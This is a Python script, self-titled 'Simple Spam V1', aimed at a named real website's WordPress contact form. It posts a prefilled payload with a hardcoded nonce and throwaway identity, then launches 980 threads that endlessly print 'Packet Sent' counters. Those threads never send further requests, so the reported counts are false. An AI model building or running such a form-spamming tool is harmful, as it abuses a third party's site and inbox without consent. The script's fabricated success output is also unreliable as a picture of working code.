import requests
import colorama
import pystyle
from pystyle import Box, Write, Colors
import time
import threading
import os
import json


payload = {
    "et_pb_contact_name_0": "NickGurs",  # random generated
    "et_pb_contact_email_0": "yasoy64606@luvnish.com",  # random generated
    "et_pb_contact_message_0": "Master",  # random generated
    "et_pb_contactform_submit_0": "et_contact_proccess",
    "_wpnonce-et-pb-contact-form-submitted-0": "b3d70476bb",
    "_wp_http_referer": "/contact/",
    "et_pb_contact_email_fields_0": """[{"field_id":"et_pb_contact_name_0","original_id":"name","required_mark":"required","field_type":"input","field_label":"Nume"},
                                        {"field_id":"et_pb_contact_email_0","original_id":"email","required_mark":"required","field_type":"email","field_label":"Email"},
                                        {"field_id":"et_pb_contact_message_0","original_id":"message","required_mark":"required","field_type":"text","field_label":"Mesaj"}]""",
}

url = 'https://lblaga.ro/contact'

response = requests.post(url, data=payload)

alr = colorama.Fore
request_number = 0


boxxx = Box.DoubleCube("Welcome To Simple Spam V1!")
Write.Print(f"{boxxx}\n", Colors.red_to_purple, interval=0.0025)
Write.Print(f"Url ->  {response.url}\n", Colors.red_to_purple, interval=0.0025)
time.sleep(0.5)
Write.Print(f"Connection ->  {response.connection}\n", Colors.red_to_purple, interval=0.0025)
time.sleep(0.5)
Write.Print(f"History ->  {response.history}\n", Colors.red_to_purple, interval=0.0025)
time.sleep(0.5)
Write.Print(f"Perma Redirect ->  {response.is_permanent_redirect}\n", Colors.red_to_purple, interval=0.0025)
time.sleep(0.5)
Write.Print(f"Encoding ->  {response.encoding}\n", Colors.red_to_purple, interval=0.0025)
time.sleep(0.5)
Write.Print(f"Elapsed ->  {response.elapsed}\n", Colors.red_to_purple, interval=0.0025)
time.sleep(0.5)
Write.Print(f"Reason ->  {response.reason}\n", Colors.red_to_purple, interval=0.0025)
time.sleep(0.5)
data = {
    'url': response.url,
    'status_code': response.status_code,
    'reason': response.reason,
    'headers': dict(response.headers),
    'json': response.json() if response.headers.get('Content-Type') == 'application/json' else None,
    'links': response.links,
    'encoding': response.encoding,
    'history': [str(resp.url) for resp in response.history],  # Convert URLs to strings
    'permanent_redirect': str(response.url) if len(response.history) > 0 and response.history[-1].status_code in [301, 302] else None
}

script_directory = os.path.dirname(os.path.abspath(__file__))

file_path = os.path.join(script_directory, 'response_data.json')

with open(file_path, 'w') as json_file:
    json.dump(data, json_file, indent=4)
Write.Print(f"Data has been written to {file_path}\n", Colors.red_to_yellow, interval=0.0035)
Write.Print("Starting..\n", Colors.red_to_purple, interval=0.0025)
time.sleep(2)

def ss1():
    global response
    global request_number
    while True:
        request_number += 1
        if response.status_code == 200:
            print(f"{alr.WHITE}({alr.GREEN}~{alr.WHITE}) -> {alr.LIGHTMAGENTA_EX}Request -> {alr.MAGENTA}{request_number}{alr.MAGENTA} -> Packet Sent {alr.LIGHTCYAN_EX} |  {alr.GREEN}Code: {response.status_code}")
        elif response.status_code != 200:
            print(f"{alr.WHITE}({alr.RED}-{alr.WHITE}) -> {alr.LIGHTMAGENTA_EX}Request -> {alr.MAGENTA}{request_number}{alr.MAGENTA} -> Packet Failed To Send {alr.LIGHTCYAN_EX} |  {alr.RED}Code: {response.status_code}")

threds = []

threads = []

for i in range(980):
    t = threading.Thread(target=ss1)
    t.daemon = True
    threads.append(t)

for i in range(980):
    threads[i].start()

for i in range(980):
    threads[i].join()
